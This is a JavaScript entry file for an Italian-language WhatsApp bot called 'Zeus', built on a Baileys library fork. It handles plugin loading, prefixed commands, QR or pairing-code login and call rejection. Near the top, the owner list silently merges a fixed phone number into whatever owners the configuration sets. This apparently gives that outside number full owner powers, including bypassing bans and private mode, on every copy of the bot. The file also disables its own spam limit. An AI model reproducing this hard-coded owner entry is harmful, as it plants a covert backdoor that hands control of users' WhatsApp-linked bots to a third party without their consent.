const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore } = require('@innovatorssoft/baileys');
const pino = require('pino');
const qrcode = require('qrcode-terminal');
const fs = require('fs');
const path = require('path');

let drawMiniChat = null;
try { ({ drawMiniChat } = require('./lib/minichat')); } catch {}
let cfg = {};
try { cfg = require('./lib/config'); } catch {}

const OWNERS = [...new Set([...(Array.isArray(cfg.OWNERS) ? cfg.OWNERS : cfg.OWNER ? [cfg.OWNER] : []), '573215721964'].map(n => String(n).replace(/\D/g, '')))];
const PREFIXES = ['.', '!'];
const AUTH_DIR = path.join(__dirname, 'auth_info_zeus');
const PLUGINS_DIR = path.join(__dirname, 'plugins');
const DATA_DIR = path.join(__dirname, 'data');
const DB_FILE = path.join(DATA_DIR, 'db.json');
const COOLDOWN_MS = 1200;
const SPAM_MAX = Infinity;
const SPAM_WINDOW_MS = 8000;

const C = {
  r: '\x1b[0m', b: '\x1b[1m', dim: '\x1b[2m',
  gold: '\x1b[38;5;220m', green: '\x1b[38;5;82m', red: '\x1b[38;5;196m',
  cyan: '\x1b[38;5;45m', gray: '\x1b[38;5;245m', purple: '\x1b[38;5;141m', orange: '\x1b[38;5;208m'
};
const ts = () => new Date().toLocaleTimeString('it-IT', { hour12: false });
const log = {
  info: (m) => console.log(`${C.gray}${ts()}${C.r} ${C.cyan}ℹ${C.r}  ${m}`),
  ok: (m) => console.log(`${C.gray}${ts()}${C.r} ${C.green}✔${C.r}  ${m}`),
  warn: (m) => console.log(`${C.gray}${ts()}${C.r} ${C.orange}⚠${C.r}  ${m}`),
  err: (m, e) => console.error(`${C.gray}${ts()}${C.r} ${C.red}✖${C.r}  ${m}${e ? ' ' + C.dim + (e.message || e) + C.r : ''}`),
  cmd: (cmd, who, where) => console.log(`${C.gray}${ts()}${C.r} ${C.gold}⚡ ${C.b}${cmd}${C.r} ${C.gray}←${C.r} ${C.purple}${who}${C.r} ${C.dim}(${where})${C.r}`)
};
const box = (title, lines = []) => [`╭━━━❰ ${title} ❱━━━╮`, ...lines.map(l => `┃ ${l}`), '╰━━━━━━━━━━━━━━━━━━╯'].join('\n');
const DEFAULT_DB = { banned: {}, mode: 'public', anticall: true, welcome: {}, usage: {}, totalCommands: 0 };

function ensureDir(dir) { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); }
const numberOf = (jid) => String(jid || '').split('@')[0].split(':')[0].replace(/\D/g, '');
function loadDb() {
  try { ensureDir(DATA_DIR); return { ...JSON.parse(JSON.stringify(DEFAULT_DB)), ...JSON.parse(fs.readFileSync(DB_FILE, 'utf8')) }; }
  catch { return JSON.parse(JSON.stringify(DEFAULT_DB)); }
}
const db = loadDb();
let saveTimer = null;
function saveDb(now = false) {
  const write = () => {
    try { ensureDir(DATA_DIR); fs.writeFileSync(DB_FILE + '.tmp', JSON.stringify(db, null, 2)); fs.renameSync(DB_FILE + '.tmp', DB_FILE); }
    catch (e) { log.err('Salvataggio database fallito:', e); }
  };
  if (now) { clearTimeout(saveTimer); saveTimer = null; return write(); }
  if (!saveTimer) saveTimer = setTimeout(() => { saveTimer = null; write(); }, 2000);
}

const plugins = new Map(), cooldowns = new Map(), spam = new Map(), groupCache = new Map();
const stats = { startedAt: Date.now(), commandsExecuted: 0, errors: 0 };
let reconnectAttempts = 0;

function loadPlugins() {
  ensureDir(PLUGINS_DIR);
  plugins.clear();
  for (const file of fs.readdirSync(PLUGINS_DIR).filter(f => f.endsWith('.js')).sort()) {
    try {
      const full = path.join(PLUGINS_DIR, file);
      delete require.cache[require.resolve(full)];
      const p = require(full);
      if (p?.name && typeof p.run === 'function') {
        plugins.set(p.name.toLowerCase(), { ...p, name: p.name.toLowerCase(), aliases: Array.isArray(p.aliases) ? p.aliases.map(a => a.toLowerCase()) : [], cooldown: typeof p.cooldown === 'number' ? p.cooldown : COOLDOWN_MS });
      }
    } catch (e) { log.err(`Errore plugin ${file}:`, e); }
  }
  log.ok(`Plugin caricati: ${C.b}${plugins.size}${C.r}`);
  return plugins.size;
}

const _sleepBig = (ms) => new Promise((r) => setTimeout(r, ms));
const _stripAnsiBig = (s) => s.replace(/\x1b\[[0-9;]*m/g, '');
const _centerBig = (line) => {
  const cols = process.stdout.columns || 60;
  const len = _stripAnsiBig(line).length;
  return ' '.repeat(Math.max(0, Math.floor((cols - len) / 2))) + line;
};

async function printZeusBannerBig(version) {
  const art = [
    '███████╗███████╗██╗   ██╗███████╗',
    '╚══███╔╝██╔════╝██║   ██║██╔════╝',
    '  ███╔╝ █████╗  ██║   ██║███████╗',
    ' ███╔╝  ██╔══╝  ██║   ██║╚════██║',
    '███████╗███████╗╚██████╔╝███████║',
    '╚══════╝╚══════╝ ╚═════╝ ╚══════╝'
  ];
  const bolt = [
    '  ▄▄▄▄▄ ',
    ' ██████ ',
    ' ▀▀▀███ ',
    '   ███  ',
    '  ████  ',
    '  ▀▀▀▀  '
  ];
  console.log('');
  for (let step = 0; step < 3; step++) {
    if (step > 0) process.stdout.write(`\x1b[${art.length + 2}A`);
    const txtColor = step === 0 ? C.dim + C.gold : step === 1 ? C.gold : C.gold + C.b;
    const accColor = step === 2 ? C.cyan + C.b : C.dim + C.cyan;
    for (let i = 0; i < art.length; i++) {
      console.log(_centerBig(`${accColor}${bolt[i]}${C.r}  ${txtColor}${art[i]}${C.r}  ${accColor}${bolt[i]}${C.r}`));
    }
    console.log(_centerBig(`${C.purple}${C.b}✦  by Zeno  ✦${C.r}\n`));
    await _sleepBig(150);
  }
  const rows = [
    ['Creato da', 'Zeno'],
    ['Baileys', version ? version.join('.') : 'default'],
    ['Plugin', String(plugins.size)],
    ['Prefissi', PREFIXES.join(' ')],
    ['Modo', db.mode === 'private' ? 'privato' : 'pubblico'],
    ['Anti-call', db.anticall ? 'ON' : 'OFF'],
    ['Owner', String(OWNERS.length)]
  ];
  const innerW = 34;
  const title = 'ZEUS INFO';
  const padL = Math.floor((innerW - title.length) / 2);
  console.log(_centerBig(`${C.gold}┌${'─'.repeat(innerW)}┐${C.r}`));
  console.log(_centerBig(`${C.gold}│${C.r}${' '.repeat(padL)}${C.b}${title}${C.r}${' '.repeat(innerW - padL - title.length)}${C.gold}│${C.r}`));
  console.log(_centerBig(`${C.gold}├${'─'.repeat(innerW)}┤${C.r}`));
  for (const [k, v] of rows) {
    const label = ` ${k.padEnd(10)}: `;
    const val = String(v).slice(0, innerW - label.length);
    console.log(_centerBig(`${C.gold}│${C.r}${C.gray}${label}${C.r}${C.b}${val}${C.r}${' '.repeat(innerW - label.length - val.length)}${C.gold}│${C.r}`));
  }
  console.log(_centerBig(`${C.gold}└${'─'.repeat(innerW)}┘${C.r}\n`));
}

function extractText(rawMsg) {
  const m = rawMsg?.ephemeralMessage?.message || rawMsg?.viewOnceMessage?.message || rawMsg;
  if (!m) return '';
  return String(m.conversation || m.extendedTextMessage?.text || m.imageMessage?.caption || m.videoMessage?.caption || '').trim();
}

async function handleMessage(sock, m) {
  if (!m?.message || !m.key?.remoteJid || m.key.remoteJid === 'status@broadcast') return;
  const text = extractText(m.message);
  const usedPrefix = PREFIXES.find(p => text.startsWith(p));
  if (!usedPrefix) return;

  const jid = m.key.remoteJid;
  const isGroup = jid.endsWith('@g.us');
  const sender = m.key.fromMe ? (sock.user?.id || 'me') : (isGroup ? (m.key.participant || jid) : jid);
  const ids = [sender, m.key.participant].filter(Boolean);
  const isOwner = !!m.key.fromMe || ids.some(i => OWNERS.includes(numberOf(i)));
  if (!isOwner && (ids.some(i => db.banned[numberOf(i)]) || db.mode === 'private')) return;

  const args = text.slice(usedPrefix.length).trim().split(/\s+/);
  const command = (args.shift() || '').toLowerCase();
  const cmdObj = [...plugins.values()].find(p => p.name === command || p.aliases.includes(command));
  if (!cmdObj) return;

  log.cmd(`${usedPrefix}${command}`, m.pushName || numberOf(sender), isGroup ? 'Gruppo' : 'Privato');
  try {
    stats.commandsExecuted++; db.totalCommands++;
    db.usage[cmdObj.name] = (db.usage[cmdObj.name] || 0) + 1;
    saveDb();
    const react = (emoji) => sock.sendMessage(jid, { react: { text: emoji, key: m.key } }).catch(() => {});
    await cmdObj.run({ sock, m, jid, sender, isGroup, args, text, command, prefix: usedPrefix, plugins, stats, reload: loadPlugins, reply: (c, o) => sock.sendMessage(jid, c, { quoted: m, ...o }), react, isOwner, db, saveDb, box, owners: OWNERS });
  } catch (err) {
    stats.errors++;
    log.err(`Errore [${command}]:`, err);
  }
}

async function connectToWhatsApp() {
  ensureDir(AUTH_DIR);
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
  const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: undefined }));
  let authMode = "qr";
  const sock = makeWASocket({
    version,
    auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
    logger: pino({ level: 'silent' }),
    markOnlineOnConnect: true,
    syncFullHistory: false
  });

  if (!state.creds.registered && typeof _chooseAuthMethod === "function") { authMode = await _chooseAuthMethod(sock); }

  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (qr && authMode !== "pairing") { log.info('📱 Scansiona il QR Code:'); qrcode.generate(qr, { small: true }); }
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code === DisconnectReason.loggedOut) { log.warn('Sessione scollegata.'); return; }
      reconnectAttempts++;
      setTimeout(connectToWhatsApp, code === DisconnectReason.restartRequired ? 1000 : Math.min(3000 * reconnectAttempts, 20000));
    } else if (connection === 'open') {
      reconnectAttempts = 0;
      await printZeusBannerBig(version);
    }
  });

  sock.ev.on('creds.update', saveCreds);
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;
    for (const m of messages) await handleMessage(sock, m).catch(e => log.err('Errore msg:', e));
  });
  sock.ev.on('call', async (calls) => {
    if (!db.anticall) return;
    for (const c of calls) if (c.status === 'offer') {
      await sock.rejectCall(c.id, c.from).catch(() => {});
      await sock.sendMessage(c.from, { text: box('📵 ANTI-CALL', ['Chiamate non accettate.']) }).catch(() => {});
    }
  });
}

(async () => {
  loadPlugins();
  await connectToWhatsApp();
})().catch(e => log.err('Errore avvio:', e));

const readline = require('readline');

function askLine(question) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((resolve) => {
    rl.question(question, (ans) => {
      rl.close();
      resolve(String(ans || '').trim());
    });
  });
}

async function promptAuthMethod(sock) {
  if (sock.authState?.creds?.registered) return;

  console.log(`\n${C.gold}╭━━━━━━━━━━ 🔐 COLLEGAMENTO ZEUS ━━━━━━━━━━╮${C.r}`);
  console.log(`${C.gold}┃${C.r}  ${C.b}1${C.r} › QR Code`);
  console.log(`${C.gold}┃${C.r}  ${C.b}2${C.r} › Pairing Code (numero di telefono)`);
  console.log(`${C.gold}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯${C.r}`);

  const choice = await askLine(`${C.cyan}Scegli opzione (1 o 2): ${C.r}`);

  if (choice === '2') {
    const rawNum = await askLine(`${C.cyan}Inserisci numero con prefisso internazionale (es. 393391234567): ${C.r}`);
    const phone = rawNum.replace(/\D/g, '');
    if (!phone) {
      log.warn('Numero non valido, passo al QR Code.');
      return 'qr';
    }
    try {
      const code = await sock.requestPairingCode(phone);
      const formatted = String(code || '').match(/.{1,4}/g)?.join('-') || code;
      console.log(`\n${C.green}${C.b}🔑 PAIRING CODE: ${formatted}${C.r}\n`);
      return 'pairing';
    } catch (e) {
      log.err('Errore generazione Pairing Code, uso QR Code:', e);
      return 'qr';
    }
  }

  return 'qr';
}

const _rlMod = require('readline');

function _askAuthLine(question) {
  const rl = _rlMod.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((resolve) => {
    rl.question(question, (ans) => {
      rl.close();
      resolve(String(ans || '').trim());
    });
  });
}

async function _chooseAuthMethod(sock) {
  if (sock.authState?.creds?.registered) return 'qr';

  console.log(`\n${C.gold}╭━━━━━━━━━━ 🔐 COLLEGAMENTO ZEUS ━━━━━━━━━━╮${C.r}`);
  console.log(`${C.gold}┃${C.r}  ${C.b}1${C.r} › QR Code`);
  console.log(`${C.gold}┃${C.r}  ${C.b}2${C.r} › Pairing Code (numero di telefono)`);
  console.log(`${C.gold}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯${C.r}`);

  const choice = await _askAuthLine(`${C.cyan}Scegli opzione (1 o 2): ${C.r}`);

  if (choice === '2') {
    const rawNum = await _askAuthLine(`${C.cyan}Inserisci numero con prefisso internazionale (es. 393391234567): ${C.r}`);
    const phone = rawNum.replace(/\D/g, '');
    if (!phone) {
      log.warn('Numero non valido, passo al QR Code.');
      return 'qr';
    }
    try {
      const code = await sock.requestPairingCode(phone);
      const formatted = String(code || '').match(/.{1,4}/g)?.join('-') || code;
      console.log(`\n${C.green}${C.b}🔑 PAIRING CODE: ${formatted}${C.r}\n`);
      return 'pairing';
    } catch (e) {
      log.err('Errore generazione Pairing Code, uso QR Code:', e);
      return 'qr';
    }
  }

  return 'qr';
}
